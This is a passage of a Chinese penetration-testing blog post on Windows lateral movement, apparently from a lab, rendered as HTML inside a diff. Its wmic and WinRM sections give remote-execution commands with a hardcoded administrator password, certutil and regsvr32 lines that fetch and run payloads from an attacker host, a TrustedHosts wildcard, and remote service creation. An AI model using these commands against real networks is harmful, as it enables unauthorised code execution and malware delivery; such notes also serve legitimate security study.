class="hljs-string">\\10.10.10.201</span> <span class="hljs-keyword">delete</span> test<br></code></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h2><blockquote>
+<p>是用户管理本地和远程计算机的  一种模型。通过它可以访问、配置、管理和监视几乎所有的Windows资源。WMI的语法十分简单，基  本上常见的命名空间、对象等用几乎一模一样。它对应的是Windows里的WMI服务（winmgmt）。  </p>
+<p>在 windows 2000之后的操作系统中内置了该服务。WMI使用公共信息模型（CIM）表示托管组件，其  中包括系统、应用程序、网络等等。CIM中使用类表示管理对象，命名空间是一个类的集合。  </p>
+<p>通过使用135端口上的远程过程调用(RPC)进行通信以进行远程访问，它允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令。</p>
+<p>  而WMIC是为WMI提供的命令行界面。  </p>
+</blockquote>
+<ol>
+<li><p>命令执行条件</p>
+<ul>
+<li>Windows Management Instrumentation 服务开启，端口TCP 135，默认开启</li>
+<li>防火墙允许 135、445 等端口通信</li>
+</ul>
+</li>
+<li><p>使用方法</p>
+<ul>
+<li><p>查询进程信息</p>
+<blockquote>
+<p>  wmic &#x2F;node:10.10.10.201  &#x2F;user:administrator &#x2F;password:1qaz@WSX3e process list brief  </p>
+</blockquote>
+</li>
+<li><p>WMI不支持执行命令，但是支持执行文件，也就是说我们可以使用cmd.exe执行对应的程序</p>
+<blockquote>
+<p>  wmic &#x2F;node:10.10.10.201 &#x2F;<strong>user</strong>:administrator &#x2F;password:1qaz@WSX3e process  <strong>call</strong> <strong>create</strong> “cmd.exe &#x2F;c ipconfig”</p>
+</blockquote>
+</li>
+<li><p>利用create创建进程</p>
+<p>  <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203143455509.png" srcset="/img/loading.gif" lazyload alt="image-20240203143455509"></p>
+</li>
+<li><p>远程执行</p>
+<blockquote>
+<p>  wmic &#x2F;node:10.10.10.201 &#x2F;<strong>user</strong>:administrator &#x2F;password:1qaz@WSX3e process  <strong>call</strong> <strong>create</strong> “cmd &#x2F;c calc.exe”</p>
+</blockquote>
+<p>如果出现User credentials cannot be used for local  connections,应该是调用calc.exe程序权限不够  的问题  </p>
+<p> 如果出现Description &#x3D; 无法启动服务，原因可能是已被禁用或与其相关联的设备没有启动，判断  WMI服务被禁用  </p>
+<p>  wmic命令缺点是没有回显，可以使用wmiexec.vbs脚本实现回显。  也可以将输出重定向其他文件</p>
+</li>
+<li><p>下载并执行文件</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle">wmic <span class="hljs-regexp">/node:10.10.10.201 /u</span>ser:administrator <span class="hljs-regexp">/password:1qaz@WSX3e process call create &quot;cmd /</span>c  certutil.exe -urlcache -split -f http:<span class="hljs-comment">//10.10.10.80/test.exe c:/windows/temp/test.exe &amp; c:/windows/temp/test.exe&quot;</span><br><br>wmic <span class="hljs-regexp">/node:10.10.10.201 /u</span>ser:administrator <span class="hljs-regexp">/password:1qaz@WSX3e process call create &quot;regsvr32 /</span>s <span class="hljs-regexp">/n /u</span> <span class="hljs-regexp">/i:http:/</span><span class="hljs-regexp">/192.168.78.117:8080/</span>feY7nzY.sct scrobj.dll<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ol>
+<h2 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h2><ol>
+<li><p>简介</p>
+<p>  WinRM 指的是Windows远程管理服务，通过远程连接winRM模块可以操作windows命令行，默认监听  端口5985（HTTP）和5986 (HTTPS)，在2012及以后默认开启。  </p>
+</li>
+<li><p>判断是否开启WinRM</p>
+<p>  判断本机是否开启WinRM服务  </p>
+<blockquote>
+<p>winrm enumerate winrm&#x2F;config&#x2F;listener</p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203144625645.png" srcset="/img/loading.gif" lazyload alt="image-20240203144625645"></p>
+<blockquote>
+<p>netstat -ano | findstr 5985  </p>
+<p>wmic service list brief | findstr WinRM</p>
+</blockquote>
+</li>
+<li><p>判断目标主机是否开启WinRM服务</p>
+</li>
+</ol>
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203144701302.png" srcset="/img/loading.gif" lazyload alt="image-20240203144701302"></p>
+<ol start="4">
+<li><p>开启</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">winrm quickconfig</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>允许远程主机访问及访问远程主机</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">winrm <span class="hljs-built_in">set</span> winrm/config<span class="hljs-built_in">/client </span>@&#123;<span class="hljs-attribute">TrustedHosts</span>=<span class="hljs-string">&quot;*&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>Winrs执行命令</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">winrs</span> -r:http://10.10.10.201:5985 -u:administrator -p:1qaz<span class="hljs-variable">@WSX3e</span> ipconfig<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">winrs</span> -r:http://10.10.10.201:5985 -u:administrator -p:1qaz<span class="hljs-variable">@WSX3e</span> <span class="hljs-string">&quot;cmd.exe&quot;</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>横向移动</p>
+<ul>
+<li><p>利用winrm参数选项中的invoke参数，来对目标对象执行特定的方法</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">winrm<span class="hljs-built_in"> invoke </span>create wmicimv2/win32_process @&#123;Commandline=<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>命令调用了Windows WMI中Win32_process类的Create方法，生成了一个calc.exe的新进程</p>
+</li>
+<li><p>在远程机器上打开进程</p>
+</li>
+</ul>
+  <figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">winrm<span class="hljs-built_in"> invoke </span>create wmicimv2/win32_process @&#123;Commandline=<span class="hljs-string">&quot;calc.exe&quot;</span>&#125; -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>在远程机器上创建服务</li>
+</ul>
+  <figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">winrm<span class="hljs-built_in"> invoke </span>Create wmicimv2/Win32_Service @&#123;Name=<span class="hljs-string">&quot;test&quot;</span>;DisplayName=<span class="hljs-string">&quot;test&quot;</span>;PathName=<span class="hljs-string">&quot;cmd.exe /k c:\59.exe&quot;</span>&#125; -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>在远程机器上启动服务  </p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">winrm<span class="hljs-built_in"> invoke </span>StartService wmicimv2/Win32_Service?Name=test -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e<br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F/">#渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>内网横向移动</div>
+      <div>https://tsy244.github.io/2024/02/02/渗透/内网横向移动/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>August Rosenberg</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>February 2, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/02/02/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/RedSun03/" title="RedSun03">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">RedSun03</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/02/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Docker%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" title="Docker未授权访问漏洞">
+                        <span class="hidden-mobile">Docker未授权访问漏洞</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/TSY244?tab=repositories" target="_blank" rel="nofollow noopener"><span>github</span></a> <i class="iconfont icon-love"></i> <a href="https://august244.github.io/" target="_blank" rel="nofollow noopener"><span>随笔</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
